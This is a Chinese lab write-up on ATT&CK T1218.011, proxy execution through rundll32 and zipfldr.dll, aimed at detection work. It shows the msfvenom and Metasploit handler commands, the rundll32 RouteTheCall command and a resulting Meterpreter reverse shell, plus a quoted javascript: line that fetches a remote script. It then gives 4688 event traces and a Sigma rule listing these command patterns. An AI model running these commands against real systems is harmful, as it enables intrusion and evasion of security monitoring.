# T1218-011-win-基于白名单Zipfldr.dll执行Payload

## 来自ATT&CK的描述

Rundll32.exe程序可以调用来执行任意二进制文件。攻击者可能会利用此功能来代理执行代码，从而避免触发那些可能不会监控rundll32.exe进程执行的安全工具，因为正常操作中使用rundll32.exe的Windows会有白名单或误报。

Rundll32.exe可用于通过未记录的shell32.dll函数Control_RunDLL和 Control_RunDLLAsUser来执行控制面板项目文件（.cpl）。双击.cpl文件也会触发rundll32.exe执行。

Rundll32也可用于执行JavaScript等脚本。可以使用类似于下面的语法来完成：rundll32.exe javascript:"..\mshtml,RunHTMLApplication ";document.write();GetObject("script:https[:]//www[.]example[.]com/malicious.sct")" 。这种方法已被恶意软件如Poweliks所使用。

## 测试案例

zipfldr.dll自Windows xp开始自带的zip文件压缩/解压工具组件，同样该工具支持WinXP-Win10 全版本，zipfldr.dll所在路径已被系统添加PATH环境变量中，因此zipfldr.dll命令可识别，但由于为dll文件，需调用rundll32.exe来执行。

补充说明：在高版本操作系统中，可以通过配置策略，对进程命令行参数进行记录。日志策略开启方法：`本地计算机策略>计算机配置>管理模板>系统>审核进程创建>在过程创建事件中加入命令行>启用`，同样也可以在不同版本操作系统中部署sysmon，通过sysmon日志进行监控。

 Windows 2003 默认位置：

C:\Windows\System32\zipfldr.dll

C:\Windows\SysWOW64\zipfldr.dll

Windows 7 默认位置：

C:\Windows\System32\zipfldr.dll

C:\Windows\SysWOW64\zipfldr.dll

## 检测日志

windows 安全日志（需要自行配置）

## 测试复现

### 环境准备

攻击机：Kali2019

靶机：windows server 2012

### 攻击分析

#### 生成payload.dll

```bash
root@12306Br0:~# msfvenom -p windows/meterpreter/reverse_tcp -b '\x00\x0b' LHOST=192.168.126.146 LPORT=4444 -f exe > shell.exe
```

#### 执行监听

攻击机,注意配置set AutoRunScript migrate f (AutoRunScript是msf中一个强大的自动化的后渗透工具，这里migrate参数是迁移木马到其他进程)

```bash
msf5 > use exploits/multi/handler
msf5 exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_tcp
PAYLOAD => windows/meterpreter/reverse_tcp
msf5 exploit(multi/handler) > set lhost 192.168.126.146
lhost => 192.168.126.146
msf5 exploit(multi/handler) > set lport 4444
lport => 4444
msf5 exploit(multi/handler) > set AutoRunScript migrate f
AutoRunScript => migrate f
msf5 exploit(multi/handler) > exploit
```

#### 靶机执行payload

```cmd
rundll32.exe zipfldr.dll,RouteTheCall .\shell.exe #shell.exe存放路径下执行
```

#### 反弹shell

```bash
msf5 exploit(multi/handler) > exploit

[*] Started reverse TCP handler on 192.168.126.146:4444
[*] Sending stage (180291 bytes) to 192.168.126.156
[*] Meterpreter session 6 opened (192.168.126.146:4444 -> 192.168.126.156:49176) at 2020-04-13 10:54:22 +0800
[*] Session ID 6 (192.168.126.146:4444 -> 192.168.126.156:49176) processing AutoRunScript 'migrate f'
[!] Meterpreter scripts are deprecated. Try post/windows/manage/migrate.
[!] Example: run post/windows/manage/migrate OPTION=value [...]

meterpreter > getuid
Server username: WIN-IFPMACUK8BT\Administrator

```

## 测试留痕

安全日志能够清晰的记录命令行参数，截取windows安全事件4688进程创建部分内容：

```log
进程信息: #4688-1
新进程 ID:0x918
新进程名称:C:\Windows\System32\rundll32.exe
令牌提升类型:TokenElevationTypeDefault (1)
创建者进程 ID:0x948
进程命令行:rundll32.exe  zipfldr.dll,RouteTheCall .\shell.exe

进程信息: #4688-2
新进程 ID:0x94c
新进程名称:C:\Users\Administrator\Desktop\a\shell.exe
令牌提升类型:TokenElevationTypeDefault (1)
创建者进程 ID:0x918
进程命令行:"C:\Users\Administrator\Desktop\a\shell.exe"
```

## 检测规则/思路

### sigma规则

```yml
title: 可疑Rundll32活动
description: 基于参数检测与rundll32相关的可疑进程
status: experimental
references:
    - http://www.hexacorn.com/blog/2017/05/01/running-programs-via-proxy-jumping-on-a-edr-bypass-trampoline/
    - https://twitter.com/Hexacorn/status/885258886428725250
    - https://gist.github.com/ryhanson/227229866af52e2d963cf941af135a52
tags:
    - attack.defense_evasion
    - attack.execution
    - attack.t1085
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        CommandLine:
            - '*\rundll32.exe* url.dll,*OpenURL *'
            - '*\rundll32.exe* url.dll,*OpenURLA *'
            - '*\rundll32.exe* url.dll,*FileProtocolHandler *'
            - '*\rundll32.exe* zipfldr.dll,*RouteTheCall *'
            - '*\rundll32.exe* Shell32.dll,*Control_RunDLL *'
            - '*\rundll32.exe javascript:*'
            - '* url.dll,*OpenURL *'
            - '* url.dll,*OpenURLA *'
            - '* url.dll,*FileProtocolHandler *'
            - '* zipfldr.dll,*RouteTheCall *'
            - '* Shell32.dll,*Control_RunDLL *'
            - '* javascript:*'
            - '*.RegisterXLL*'
    condition: selection
falsepositives:
    - False positives depend on scripts and administrative tools used in the monitored environment
level: medium
```

### 建议

可根据进程创建事件4688/1（进程名称、命令行）进行监控。本监控方法需要自行安装配置审核策略Sysmon。

## 参考推荐

MITRE-ATT&CK-T1085

<https://attack.mitre.org/techniques/T1085/>

基于白名单的Payload

<https://blog.csdn.net/weixin_30790841/article/details/101848854>
